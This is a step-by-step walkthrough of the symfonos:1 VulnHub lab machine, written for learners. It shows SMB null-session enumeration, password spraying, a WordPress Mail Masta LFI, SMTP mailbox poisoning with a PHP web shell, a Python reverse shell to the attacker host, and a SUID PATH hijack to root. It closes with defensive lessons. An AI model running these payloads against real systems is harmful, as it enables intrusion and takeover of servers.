# symfonos: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | symfonos: 1 |
| **Difficulty** | Easy / Medium (labelled "Beginner"; the SMTP trick is the learning moment) |
| **Author** | Zayotic |
| **Released** | 29 June 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/symfonos-1,322/> |
| **Download** | <https://vulnhub.com/entry/symfonos-1,322/#download> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux — Debian (Samba 4.5.16, Apache 2.4.25, WordPress 5.2.2) |

> **Note:** VMware and VirtualBox builds can vary slightly ("varies by build") —
> banners, share contents and the exact WordPress plugin paths may differ. The
> attack chain below is the intended one.

---

## 0. What you will learn

- How to enumerate an **SMB / Samba** file share, including an **anonymous (null) share**.
- How a "password policy" note can double as a **password list** for spraying.
- How to read a **WordPress** install with `wpscan` and find a **vulnerable plugin**.
- What a **Local File Inclusion (LFI)** is and how to confirm it by reading `/etc/passwd`.
- **SMTP log poisoning:** writing PHP into a mailbox, then including that mailbox via LFI to get **remote code execution (RCE)**.
- How to escalate via a **SUID binary that calls `curl` without a full path** — a classic **`PATH` hijack**.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Kali must be on the same host-only/NAT
network as the target, and you should add `symfonos.local` to `/etc/hosts`.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP on the lab network. It uses DHCP, so the IP may
> change on every import.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120
   ________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
   ________________________________________________________________________
   192.168.56.1    0a:00:27:00:00:00      1      60  Cadmus Computer Systems
   192.168.56.101  08:00:27:12:34:56      2     120  PCS Systemtechnik GmbH
```

> **How to read it:** `netdiscover` (like `arp-scan`) lists live hosts on the
> subnet. `192.168.56.101` is our target.

**Target IP:** `192.168.56.101`

![Finding the target](images/01-recon.png)

Add the hostname (the SMB server and WordPress both advertise `symfonos.local`):

```bash
echo "192.168.56.101 symfonos.local symfonos.localdomain" | sudo tee -a /etc/hosts
```

---

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

```bash
sudo nmap -sC -sV -p 22,25,80,139,445 -oA scans/services 192.168.56.101
```

```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
```

> **How to read it:** five services. The interesting ones:
> - **139/445 Samba** — file shares are a rich source of leaks.
> - **80 HTTP** — the web app (WordPress).
> - **25 SMTP** — remember this; it becomes part of the code-execution chain.
> - **22 SSH** — useful once we have credentials.

![Nmap scan output](images/02-nmap.png)

### 2.2 SMB — anonymous share

```bash
smbclient -L //192.168.56.101 -N
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
```

> **Why it works:** `-N` means "no password" (a **null session**). If the server
> allows anonymous listing, it hands us the share names. `anonymous` is
> world-readable; `helios` likely needs a login.

```bash
smbclient //192.168.56.101/anonymous -N
```

```text
smb: \> ls
  attention.txt                       N      154
smb: \> get attention.txt
smb: \> exit
cat attention.txt
```

```text
A word to the wise...
All users are required to change their passwords. The following passwords are now BANNED:
epidioko
qwerty
baseball
```

> **Why it matters:** a note like this is effectively a **password list**.
> Banned/known passwords are exactly the ones lazy users still reuse.

![SMB anonymous share](images/03-enum.png)

### 2.3 Enumerate users, then spray the passwords

```bash
enum4linux -a 192.168.56.101
```

```text
[+] Enumerating users using SID S-1-5-21-... and logon username '', password ''
 S-1-5-21-...-1000 SYMFONOS\helios (Local User)
 S-1-5-21-...-1001 SYMFONOS\zeus   (Local User)
```

> **Why it works:** `enum4linux` asks Samba for its local user list. We learned
> the usernames `helios` and `zeus`. Combine them with the "banned" passwords
> and try to log into the `helios` share.

```bash
smbclient //192.168.56.101/helios -U 'helios%qwerty'
```

```text
smb: \> ls
  research.txt                        A      432
  todo.txt                            A       52
smb: \> get research.txt
smb: \> get todo.txt
smb: \> exit
cat todo.txt
```

```text
1. vi /etc/hosts to add symfonos.local
2. I'm working on a WordPress site at /h3l105
3. ...
```

> **Why it works:** `helios` reused the banned password `qwerty`. The share
> leaks the **hidden WordPress path `/h3l105`** and confirms the `.local` host.

### 2.4 WordPress enumeration

Browse `http://symfonos.local/h3l105/` (needs the `/etc/hosts` entry from §1).

```bash
wpscan --url http://symfonos.local/h3l105 --plugins-detection aggressive -e ap,u
```

```text
[+] WordPress version 5.2.2 identified (Insecure)
[+] Enumerating Plugins ...
[+] mail-masta
 | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
 | Version: 1.0 (100% confidence)
[+] site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Version: 1.1.1 (80% confidence)
[i] User(s) Identified:
[+] admin
```

> **Why it works:** `-e ap,u` enumerates **all plugins** and **usernames**.
> Both plugins are old and both are **vulnerable to Local File Inclusion**.

```bash
searchsploit wordpress mail masta
```

```text
WordPress Plugin Mail Masta 1.0 - Local File Inclusion | php/webapps/40290.txt
```

---

## 3. Foothold

### 3.1 Confirming the LFI

The Mail Masta plugin's `count_of_send.php` includes a file named by the `pl`
parameter without validation:

```bash
curl "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
helios:x:1000:1000:helios,,,:/home/helios:/bin/bash
```

> **Why it works:** the plugin does `include($_GET['pl']);`. Supplying
> `/etc/passwd` makes PHP include and print that system file — a textbook **LFI**.

We can read files, but not yet run code. The key insight: **port 25 (SMTP) is
open**, and mail is stored in a file we can include (`/var/mail/helios`).

### 3.2 SMTP log poisoning → RCE

Send an email to `helios` whose body contains PHP. Postfix stores the message in
`/var/mail/helios`; when the LFI includes that file, the PHP executes.

```bash
telnet 192.168.56.101 25
```

```text
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM: attacker@kali
250 2.1.0 Ok
RCPT TO: helios
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['c']); ?>
.
250 2.0.0 Ok: queued as 3D63B40698
QUIT
221 2.0.0 Bye
```

Now include the poisoned mailbox and pass a command in `&c=`:

```bash
curl "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** the LFI returns `/var/mail/helios`, and the PHP we mailed in
> runs on the server with the web user's privileges. **LFI + log poisoning =
> Remote Code Execution.** (Some builds return `helios` instead of `www-data`.)

### 3.3 Getting a reverse shell

Confirm a shell-capable interpreter exists, then send a reverse shell:

```bash
curl "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=which+python"
```

On Kali, start a listener:

```bash
nc -lvnp 4444
```

Then request (URL-encode the payload as needed):

```text
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=python+-c+'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.56.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```text
$ whoami; id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade to a TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:  stty raw -echo; fg   and:  export TERM=xterm
```

![Reverse shell foothold](images/04-foothold.png)
![Interactive shell](images/05-shell.png)

### 3.4 The user flag

```bash
cat /home/helios/user.txt 2>/dev/null || find / -name "*.txt" -path "*helios*" 2>/dev/null
```

```text
(symfonos user flag)
```

![User flag](images/06-user-flag.png)

---

## 4. Privilege escalation

### 4.1 Hunt for SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/opt/statuscheck          <-- not a standard binary, investigate
/bin/mount
/bin/umount
/bin/su
/bin/ping
```

> **Why it works:** the **SUID** bit makes a program run as its owner (here,
> `root`) no matter who starts it. `/opt/statuscheck` is custom, so it is the
> obvious target.

```bash
file /opt/statuscheck
strings -n 6 /opt/statuscheck
```

```text
/opt/statuscheck: setuid ELF 64-bit LSB shared object, x86-64, ... not stripped
...
curl -I
http://localhost
```

> **Why it works:** `strings` shows the binary runs the command **`curl -I
> http://localhost`** — using the bare name `curl`, **not** `/usr/bin/curl`.
> Linux resolves bare names by searching the **`$PATH` environment variable**
> from left to right. If we put our own `curl` earlier in `$PATH`, root will run
> *our* program.

### 4.2 `PATH` hijack

```bash
cd /tmp
printf '/bin/sh -p\n' > curl
chmod +x curl
export PATH=/tmp:$PATH
/opt/statuscheck
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** `/tmp` is now first in `$PATH`, so when `statuscheck` runs
> as root and calls `curl`, it executes `/tmp/curl` — our script — as root.
> Creating a setuid copy of bash (`cp /bin/bash /tmp/rootbash && chmod u+s ...`)
> works too, then run `/tmp/rootbash -p`. A compiled C version
> (`setuid(0); system("/bin/sh");`) is the more common writeup approach.

### The root flag

```bash
cat /root/proof.txt
```

```text
Congrats on rooting symfonos:1!
(symfonos root proof)
```

![Privilege escalation to root](images/07-privesc.png)
![Root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous SMB share leaks a password policy | `\\target\anonymous` (`attention.txt`) | Provides a reusable password list |
| 2 | Weak/reused SMB password | `helios` share (`helios:qwerty`) | Read the share → hidden WordPress path `/h3l105` |
| 3 | Outdated vulnerable WordPress plugins | `mail-masta 1.0`, `site-editor 1.1.1` | Local File Inclusion (arbitrary file read) |
| 4 | LFI + SMTP log poisoning | `count_of_send.php?pl=/var/mail/helios` | Remote Code Execution → shell |
| 5 | SUID binary calls `curl` by bare name | `/opt/statuscheck` | `PATH` hijack → root |
| 6 | WordPress user enumeration | `/h3l105` | Reveals the `admin` account |
| 7 | Unprotected Postfix mailbox | `/var/mail/helios` | Delivers the poisoned payload |

## 6. Defensive lessons (blue team)

- **Kill anonymous SMB access** and audit share permissions. A "banned password"
  note should never be world-readable — it is an attacker shopping list.
- **Enforce real password policy and MFA**; block username-as-password and
  dictionary-reused credentials. Rotate the leaked `helios:qwerty`.
- **Patch WordPress and remove unused plugins.** `mail-masta` had been abandoned
  for years; a supported CMS build would not ship a known LFI.
- **Validate includes.** Plugins must not pass user input into `include`/`require`.
- **Don't let the web server store mail it can then execute.** If the request path
  and the mail path are the same trust zone, LFI+log poisoning becomes trivial RCE.
- **Fix `PATH` hijacking:** always call binaries by absolute path (`/usr/bin/curl`)
  in privileged scripts, reset `env`, and never trust the caller's `$PATH`. Strip
  the SUID bit unless truly required.
- **Detection ideas:** alert on SMTP messages containing `<?php`, on HTTP requests
  to `mail-masta`/`site-editor` paths, on outbound shells from `www-data`, and on
  writes to `/tmp` followed by root process execution (`auditd`).

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/symfonos-1,322/>
- Author's writeup: <https://blog.zay.li/symfonos-1-boot2root-ctf/>
- Community writeups consulted:
  - [Symfonos 1 Vulnhub Walkthrough — Junhua's Cyber Lab](https://junhuacyber.com/ctf-walkthroughs/vulnhub/symfonos-1-vulnhub-walkthrough/)
  - [Symfonos 1 writeup — yufongg (GitHub)](https://github.com/yufongg/writeups/blob/main/Vulnhub/Linux/Symfonos%201/Symfonos%201.md)
  - [Symfonos: 1 Walkthrough — HackMD](https://hackmd.io/@rudefish/vulnhub-symfonos-series-symfonos1-walkthrough)
  - [Symfonos — Ethan Michalak](https://xfaraday.com/writeups/symfonos/)
- Vendor advisories / docs:
  - [Exploit-DB 40290 — WordPress Mail Masta 1.0 LFI](https://www.exploit-db.com/exploits/40290)
  - [WPScan](https://wpscan.com/)
  - [GTFOBins](https://gtfobins.github.io/) — abusing SUID/sudo binaries
  - [MITRE ATT&CK T1574.007 — PATH Interception](https://attack.mitre.org/techniques/T1574/007/)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target
- [ ] `images/02-nmap.png` — port/service scan
- [ ] `images/03-enum.png` — the key enumeration finding (anonymous share / `attention.txt`)
- [ ] `images/04-foothold.png` — SMTP poisoning + LFI RCE / reverse shell
- [ ] `images/05-shell.png` — the interactive shell
- [ ] `images/06-user-flag.png` — user flag
- [ ] `images/07-privesc.png` — the `PATH` hijack / root
- [ ] `images/08-root-flag.png` — root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
